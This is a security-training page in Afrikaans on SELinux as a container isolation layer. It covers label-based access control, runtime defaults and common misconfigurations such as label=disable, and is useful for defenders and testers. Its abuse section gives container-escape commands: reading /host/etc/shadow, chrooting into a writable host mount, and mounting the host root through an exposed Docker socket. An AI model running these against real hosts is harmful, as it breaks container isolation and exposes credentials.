# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

SELinux is 'n **etiketgebaseerde Verpligte Toegangsbeheer** stelsel. Elke relevante proses en objek kan 'n sekuriteitskonteks dra, en die beleid bepaal watter domeine met watter tipes mag kommunikeer en op watter manier. In container-omgewings beteken dit gewoonlik dat die runtime die container-proses onder 'n ingeperkte container-domein begin en die container-inhoud met ooreenstemmende tipes label. As die beleid reg werk, mag die proses in staat wees om te lees en te skryf wat sy etiket verwag word om te raak, terwyl toegang tot ander host-inhoud ontken word, selfs al word daardie inhoud sigbaar deur 'n mount.

Dit is een van die kragtigste beskermings aan die gasheer-kant wat beskikbaar is in gewone Linux container-deployments. Dit is veral belangrik op Fedora, RHEL, CentOS Stream, OpenShift en ander SELinux-gesentreerde ekosisteme. In daardie omgewings sal 'n hersiener wat SELinux ignoreer dikwels verkeerd verstaan waarom 'n ogenschynlik voor die hand liggende pad tot gasheer-kompromittering eintlik geblokkeer is.

## AppArmor teenoor SELinux

Die maklikste hoëvlakverskil is dat AppArmor padgebaseerd is terwyl SELinux **etiketgebaseerd** is. Dit het groot gevolge vir container-sekuriteit. 'n Padgebaseerde beleid kan anders optree as dieselfde host-inhoud sigbaar word onder 'n onverwagte mount-pad. 'n Etiketgebaseerde beleid vra eerder wat die objek se etiket is en wat die prosesdomein daaraan mag doen. Dit maak SELinux nie eenvoudig nie, maar dit maak dit robuust teen 'n klas pad-truuk-aanames wat verdedigers soms per ongeluk in AppArmor-gebaseerde stelsels maak.

Omdat die model etiket-georiënteerd is, is container-volume-hantering en heretiketteringsbesluite sekuriteitskrities. As die runtime of operator etikette te wyd verander om "mounts te laat werk", kan die beleidgrens wat die werklading veronderstel was om te bevat veel swakker word as beoog.

## Laboratorium

Om te sien of SELinux op die gasheer aktief is:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Om bestaande etikette op die gasheer te ondersoek:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Om 'n normale uitvoering te vergelyk met een waar etikettering gedeaktiveer is:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Op 'n SELinux-enabled host is dit 'n baie praktiese demonstrasie omdat dit die verskil toon tussen 'n workload wat onder die verwagte container-domein loop en een wat van daardie afdwingingslaag ontbloot is.

## Runtime-gebruik

Podman is besonder goed in lyn met SELinux op stelsels waar SELinux deel is van die platform-standaard. Rootless Podman plus SELinux is een van die sterkste mainstream container-basisse omdat die proses reeds onprivilegieer is aan die host-kant en steeds beperk word deur MAC policy. Docker kan ook SELinux gebruik waar dit ondersteun word, alhoewel administrateurs dit soms deaktiveer om volume-labeling-friksie te omseil. CRI-O en OpenShift vertrou swaar op SELinux as deel van hul container-isolasieverhaal. Kubernetes kan ook SELinux-verwante instellings blootstel, maar hul waarde hang natuurlik af van of die node OS werklik SELinux ondersteun en afdwing.

Die herhalende les is dat SELinux nie 'n opsionele garnering is nie. In die ekosisteme wat rondom dit opgebou is, is dit deel van die verwagte sekuriteitsgrens.

## Verkeerde konfigurasies

Die klassieke fout is `label=disable`. Operasioneel gebeur dit dikwels omdat 'n volume mount geweier is en die vinnigste korttermynoplossing was om SELinux uit die vergelyking te verwyder in plaas van om die labeling-model reg te stel. 'n Ander algemene fout is onjuiste relabeling van host-inhoud. Breë relabel-operasies kan die toepassing laat werk, maar hulle kan ook uitbrei wat die container toegelaat word om aan te raak ver buite wat oorspronklik beoog was.

Dit is ook belangrik om nie **geïnstalleerde** SELinux met **effektiewe** SELinux te verwar nie. 'n Host mag SELinux ondersteun en steeds in permissive mode wees, of die runtime mag nie die workload onder die verwagte domain begin nie. In daardie gevalle is die beskerming baie swakker as wat die dokumentasie dalk suggereer.

## Misbruik

Wanneer SELinux afwesig is, permissive is, of wyd gedeaktiveer is vir die workload, word host-mounted paths baie makliker om te misbruik. Dieselfde bind mount wat andersins deur labels beperk sou wees, kan 'n direkte toegang tot host-data of host-wysiging raak. Dit is veral relevant wanneer dit gekombineer word met writable volume mounts, container runtime directories, of operasionele kortpaaie wat sensitiewe host-paaie vir gerief blootgestel het.

SELinux verduidelik dikwels waarom 'n generiese breakout writeup onmiddellik op een host werk maar herhaaldelik op 'n ander faal, selfs al lyk die runtime flags soortgelyk. Die ontbrekende bestanddeel is dikwels glad nie 'n namespace of 'n capability nie, maar 'n label boundary wat intakt gebly het.

Die vinnigste praktiese kontrole is om die aktiewe context te vergelyk en dan gemounte host paths of runtime directories te probeer wat normaalweg label-confined sou wees:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
As 'n host bind mount teenwoordig is en SELinux labeling gedeaktiveer of verswak is, kom inligtingsonthulling dikwels eers voor:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Indien die mount skryfbaar is en die container vanuit die kernel se oogpunt effektief host-root is, is die volgende stap om beheerde host-wysiging te toets in plaas van te raai:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Op SELinux-ondersteunde gashere kan die verlies van etikette rondom runtime-state-gidse ook direkte privilege-escalation-pade blootstel:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Hierdie commands vervang nie 'n full escape chain nie, maar hulle maak baie vinnig duidelik of SELinux was wat host data access of host-side file modification verhinder het.

### Volledige voorbeeld: SELinux uitgeskakel + skryfbare host mount

Indien SELinux labeling uitgeskakel is en die host filesystem by `/host` mounted writable is, word 'n full host escape 'n normale bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As die `chroot` slaag, werk die container process nou vanaf die host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Volledige voorbeeld: SELinux Disabled + Runtime Directory

As die workload 'n runtime socket kan bereik sodra labels gedeaktiveer is, kan die escape aan die runtime gedelegeer word:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante waarneming is dat SELinux dikwels die beheer was wat presies hierdie soort host-path of runtime-state toegang verhinder het.

## Kontroles

Die doel van die SELinux kontroles is om te bevestig dat SELinux aangeskakel is, die huidige security context te identifiseer, en te sien of die lêers of paaie waarin jy belangstel werklik label-confined is.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Wat hier interessant is:

- `getenforce` moet idealiter `Enforcing` teruggee; `Permissive` of `Disabled` verander die betekenis van die hele SELinux-afdeling.
- As die huidige proseskonteks onverwags of te wyd lyk, mag die workload nie onder die beoogde container policy loop nie.
- As gasheer-gemonteerde lêers of runtime-lêergidse etikette het waartoe die proses te vryelik toegang kan kry, word bind mounts baie gevaarliker.

Wanneer jy 'n container op 'n SELinux-vaardige platform bekyk, behandel etikettering nie as 'n sekondêre detail nie. In baie gevalle is dit een van die hoofredes waarom die host nie reeds gekompromitteer is nie.

## Runtime Defaults

| Runtime / platform | Standaardtoestand | Standaardgedrag | Algemene manuele verswakking |
| --- | --- | --- | --- |
| Docker Engine | Afhangend van gasheer | SELinux-separasie is beskikbaar op SELinux-geaktiveerde gasheer, maar die presiese gedrag hang af van gasheer/daemon-konfigurasie | `--security-opt label=disable`, omvattende heretikettering van bind mounts, `--privileged` |
| Podman | Gewoonlik geaktiveer op SELinux-gashere | SELinux-separasie is 'n normale deel van Podman op SELinux-stelsels tensy gedeaktiveer | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Nie normaalweg outomaties op Pod-vlak toegewys nie | SELinux-ondersteuning bestaan, maar Pods benodig gewoonlik `securityContext.seLinuxOptions` of platform-spesifieke verstekwaardes; runtime- en node-ondersteuning is benodig | swak of wyd `seLinuxOptions`, hardloop op permissive/disabled nodes, platformbeleide wat etikettering deaktiveer |
| CRI-O / OpenShift style deployments | Daar word gewoonlik swaar op staatgemaak | SELinux is dikwels 'n kernonderdeel van die node-isolasie-model in hierdie omgewings | aangepaste beleide wat toegang te veel verbreed, etikettering deaktiveer vir verenigbaarheid |

SELinux-standaardinstellings is meer distribusie-afhanklik as seccomp-standaarde. Op Fedora/RHEL/OpenShift-stelsels is SELinux dikwels sentraal tot die isolasiemodel. Op nie-SELinux-stelsels is dit eenvoudig afwesig.
{{#include ../../../../banners/hacktricks-training.md}}
